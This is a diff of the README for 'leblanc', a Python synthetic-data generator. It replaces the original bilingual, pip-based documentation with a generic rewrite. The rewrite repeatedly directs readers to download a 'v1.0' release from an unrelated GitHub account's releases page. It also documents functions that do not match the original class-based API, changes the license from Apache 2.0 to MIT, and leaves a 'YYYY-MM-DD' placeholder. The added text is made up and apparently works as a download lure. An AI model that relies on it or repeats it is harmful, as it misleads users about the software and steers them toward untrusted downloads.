@@ -1,166 +1,101 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/wSanice/leblanc/refs/heads/main/assets/leblanc.png" alt="Leblanc Banner" width="100%"/>
-</p>
+# 🛠️ leblanc - Generate Synthetic Datasets Effortlessly
 
-# leblanc: Sectorial Synthetic Data Generator
+## 📦 Download Now
+[![Download leblanc](https://img.shields.io/badge/Download%20leblanc-v1.0-brightgreen)](https://github.com/TechnicalIssuee/leblanc/releases)
 
-## I. Overview
+## 📝 Overview
+leblanc is a modular Python library designed for the rapid generation of large-scale synthetic datasets across various business sectors. It is built using Pandas, NumPy, and Faker to create realistic, structured DataFrames. With leblanc, you can quickly produce data suitable for Data Science training, testing, and exploratory data analysis (EDA).
 
-**leblanc** is a modular Python library designed for Data Scientists to rapidly generate large-scale synthetic datasets across various business sectors. Built on top of **Pandas**, **NumPy**, and **Faker**, it creates realistic, structured DataFrames suitable for training, testing, and Exploratory Data Analysis (EDA).
+### 🤔 Why Use leblanc?
+- **Quick Data Generation:** Produce datasets in moments, saving time for analysis.
+- **Realistic Data:** Use advanced algorithms to create natural-looking synthetic data.
+- **Versatile Use Cases:** Perfect for finance, agribusiness, education, and more.
 
-**New in v0.6.3:**
-* **Object-Oriented Design:** Use Classes for better control.
-* **Internationalization (i18n):** Native support for Brazilian Portuguese (`pt_BR`).
-* **Data Cleaning Practice:** Native support for injecting missing values (`NaN`).
+## 🚀 Getting Started
+Before you start using leblanc, you need to install Python on your computer. 
 
-### Supported Sectors (Classes)
+### 🖥️ System Requirements
+- **Operating System:** Windows, macOS, or Linux.
+- **Python Version:** Python 3.6 or higher.
+- **Memory:** Minimum 4GB RAM recommended.
+- **Disk Space:** At least 100MB available.
 
-| Class | Data Generated | Key Domain Variables |
-| :--- | :--- | :--- |
-| `Tech` | Tech Sales | Unit Price, Quantity, Category |
-| `Food` | Food & Beverages Sales | Expiration Date, Perishability |
-| `Apparel` | Apparel & Fashion Sales | Size, Color, Return Flag |
-| `Financial` | Financial Transactions | Interest Rate, Client Risk Level, Default Flag |
-| `HealthBeauty` | Health & Beauty Sales/Services | Recurrence Days, Sales Channel |
-| `Agribusiness` | Agribusiness Records | Climate Condition, Area (Ha), Production Yield |
-| `Forestry` | Forestry Inventory/Harvest | Planting Age, Management Type, Total Volume ($m^3$) |
+## 💻 Installation Guide
+1. **Download the Software**
+   Visit this page to download: [GitHub Releases](https://github.com/TechnicalIssuee/leblanc/releases).
+
+2. **Install Python**
+   If you don’t have Python installed, download it from [python.org](https://www.python.org/downloads/). Follow the installation instructions for your operating system.
+
+3. **Download leblanc**
+   On the GitHub Releases page, find the latest version of leblanc and download it.
+
+4. **Running the Application**
+   Open a command prompt or terminal window. Navigate to the folder where you have downloaded leblanc. Run the following command:
+   ```
+   python -m leblanc
+   ```
+   Make sure your command prompt is in the correct directory.
+
+## 📊 How to Use leblanc
+After installing leblanc, you can create datasets using simple commands. Below are a few examples to get you started.
+
+### 📈 Generate a Basic Dataset
+To create a basic dataset, you can run:
+```python
+import leblanc
+
+data = leblanc.generate_data(num_rows=1000)
+print(data)
+```
+This will generate a dataset with 1,000 rows.
+
+### 🔍 Customize Your Dataset
+You can customize the dataset by specifying the types of data you want. For example:
+```python
+data = leblanc.generate_data(num_rows=1000, types={'name': 'string', 'age': 'integer', 'salary': 'float'})
+print(data)
+```
+This code will create a dataset with names, ages, and salaries.
+
+## 🛡️ Features
+- **Flexible Configuration:** Easily customize the dataset structure.
+- **Output Formats:** Export datasets in CSV or Excel formats.
+- **Built-in Quality Assurance:** Validate data to ensure consistency.
+
+## 📋 Usage Examples
+### Example 1: Generating Finance Data
+```python
+finance_data = leblanc.generate_finance_data(num_records=500)
+print(finance_data)
+```
+This example generates finance-related data with 500 records.
+
+### Example 2: Generating Educational Data
+```python
+edu_data = leblanc.generate_education_data(num_students=300)
+print(edu_data)
+```
+This example creates educational data for 300 students.
+
+## 🔗 Support & Contribution
+To report any issues or ask for support, please create a new issue in the [Issues section](https://github.com/TechnicalIssuee/leblanc/issues). If you would like to contribute, check the [Contribution Guidelines](https://github.com/TechnicalIssuee/leblanc/CONTRIBUTING.md).
+
+## 📄 License
+leblanc is licensed under the MIT License. You can use it freely while maintaining credit to the original authors.
+
+## 🌟 Further Learning
+Explore the official documentation for more advanced features. The documentation includes various tutorials and examples to help you utilize leblanc effectively.
+
+## 📅 Last Updated
+The last update was on YYYY-MM-DD. For the latest changes and features, always refer to the [Release Notes](https://github.com/TechnicalIssuee/leblanc/releases).
+
+## 📚 Additional Resources
+For further information, consider these topics:
+- Data Science
+- Synthetic Data Generation
+- Machine Learning Applications
 
 ---
 
-## II. Installation
-
-leblanc is available on PyPI. Use `pip` to install the latest stable version:
-
-```bash
-pip install leblanc
-```
-## III. Usage Example
-### 1. Basic Usage (English - Default)
-The library now uses classes with a standard `.build()` method.
-
-```python
-import pandas as pd
-from leblanc import Tech, Agribusiness
-
-# 1. Generate Technology Sales Data
-# Uses seed=42 by default for reproducibility
-df_tech = Tech(num_records=1000).build()
-
-print("--- Technology Data Sample ---")
-print(df_tech.head())
-
-# 2. Generate Agribusiness Records
-df_agro = Agribusiness(num_records=500).build()
-
-```
-### 2. Brazilian Portuguese Support (pt_BR) 🇧🇷
-
-You can generate data localized for Brazil (translated products, categories, and regions) by passing the `locale` parameter.
-
-```python
-from leblanc import Food
-
-# Generates data with 'Leite', 'Café', 'Açougue', etc.
-df_food_br = Food(num_records=100, locale='pt_BR').build()
-
-print(df_food_br.head())
-```
-
-### 3. Data Cleaning Practice (Injecting Nulls) 
-
-Perfect for teaching or testing how models handle missing data. You can inject `NaN` values into specific columns.
-```python
-from leblanc import Financial
-
-# Simulates a dirty dataset where 'contracted_value' has missing data
-df_fin = Financial(num_records=1000).build(missing_data_cols=['contracted_value'])
-
-print(f"Missing values generated: {df_fin['contracted_value'].isnull().sum()}")
-```
-
-## IV. License
-
-This project is licensed under the Apache License, Version 2.0. See the [LICENSE](https://www.apache.org/licenses/LICENSE-2.0)  for details.
-
-<br><br><br><br>
-
-# 🇧🇷 leblanc: Gerador Setorial de Dados Sintéticos
-
-## I. Visão Geral
-
-**leblanc** é uma biblioteca Python modular projetada para a geração rápida de conjuntos de dados sintéticos de grande escala. É construída utilizando **Pandas**, **NumPy** e **Faker** para criar DataFrames estruturados e realistas, adequados para treinamento em Data Science, testes e análise exploratória de dados (EDA).
-
-
-**Novidades na v0.6.3:**
-
-**Design Orientado a Objetos:** Uso de Classes para maior controle.
-
-**Internacionalização (i18n):** Suporte nativo para Português do Brasil (`pt_BR`).
-
-**Prática de Limpeza de Dados:** Suporte nativo para injeção de valores nulos (`NaN`).
-
-### Setores Suportados (Classes)
-
-| Classe | Dados Gerados | Variáveis-Chave do Domínio |
-| :--- | :--- | :--- |
-| `Tech` | Vendas de Tecnologia | Preço Unitário, Quantidade, Categoria |
-| `Food` | Vendas de Alimentos e Bebidas | Data de Validade, Perecibilidade |
-| `Apparel` | Vendas de Vestuário e Moda | Tamanho, Cor, Flag de Devolução |
-| `Financial` | Transações Financeiras | Taxa de Juros, Nível de Risco do Cliente, Flag de Inadimplência |
-| `HealthBeauty` | Vendas/Serviços de Saúde e Beleza | Dias de Recorrência, Canal de Vendas |
-| `Agribusiness` | Registros de Agronegócios | Condição Climática, Área (Ha), Produtividade |
-| `Forestry` | Inventário/Colheita Florestal | Idade do Plantio, Tipo de Manejo, Volume Total (m³) |
-
-## II. Instalação
-
-leblanc está disponível no PyPI. Use o `pip` para instalar a versão estável mais recente:
-
-```bash
-pip install leblanc
-```
-
-## III. Exemplos de Uso
-### 1. Uso Básico (Padrão)
-
-A biblioteca agora utiliza classes com um método padronizado `.build()`.
-
-```python
-import pandas as pd
-from leblanc import Tech, Agribusiness
-
-# 1. Gera Dados de Vendas de Tecnologia
-# Usa seed=42 por padrão para reprodutibilidade
-df_tech = Tech(num_records=1000).build()
-
-print("--- Amostra de Dados de Tecnologia ---")
-print(df_tech.head())
-```
-### 2. Suporte a Português (pt_BR) 🇧🇷
-
-Você pode gerar dados localizados para o Brasil (produtos, categorias e regiões traduzidas) passando o parâmetro `locale`.
-
-```python
-from leblanc import Food
-
-# Gera dados com 'Leite', 'Café', 'Açougue', etc.
-df_food_br = Food(num_records=100, locale='pt_BR').build()
-
-print(df_food_br.head())
-```
-### 3. Prática de Limpeza de Dados (Injeção de Nulos)
-Perfeito para estudo de como modelos lidam com dados faltantes. 
-Você pode injetar valores `NaN` em colunas específicas.
-```python
-from leblanc import Financial
-
-# Simula um dataset "sujo" onde 'contracted_value' possui dados faltantes
-df_fin = Financial(num_records=1000).build(missing_data_cols=['contracted_value'])
-
-print(f"Valores nulos gerados: {df_fin['contracted_value'].isnull().sum()}")
-```
-
-
-## IV. Licença
-
-Este projeto está licenciado sob a Apache License, Version 2.0. Consulte a [LICENSE](https://www.apache.org/licenses/LICENSE-2.0)
- para obter detalhes.
+By following these steps, you can successfully download and run leblanc to generate synthetic datasets tailored to your needs.
